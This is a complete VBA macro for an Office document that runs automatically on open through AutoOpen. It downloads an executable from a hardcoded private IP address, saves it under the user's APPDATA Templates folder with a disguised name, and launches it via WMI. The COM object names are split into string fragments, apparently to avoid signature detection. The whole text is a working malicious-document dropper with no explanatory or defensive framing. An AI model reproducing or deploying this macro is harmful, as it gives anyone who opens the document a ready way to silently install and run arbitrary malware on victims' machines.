Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()

    
    Dim url As String: url = "http://192.168.45.242/java.exe"
    Dim targetPath As String: targetPath = Environ("APPDATA") & "\Microsoft\Templates\vba_sync.exe"
    
    Dim objXML As Object
    Dim objStream As Object

    Set objXML = CreateObject("MS" & "XML2.Server" & "XMLHTTP.6.0")
    objXML.Open "GET", url, False
    objXML.Send
    
    If objXML.Status = 200 Then
        Set objStream = CreateObject("AD" & "ODB.St" & "ream")
        objStream.Open
        objStream.Type = 1
        objStream.Write objXML.ResponseBody
        objStream.SaveToFile targetPath, 2
        objStream.Close
    Else
        Exit Sub
    End If


    Dim strWMI As String
    strWMI = "win" & "mgmts:\\.\root\cim" & "v2:Win32_Process"
    
    Dim objWMI As Object
    Set objWMI = GetObject(strWMI)
    
    Dim intStatus As Integer
    intStatus = objWMI.Create(targetPath, Null, Null, 0)
    
End Sub


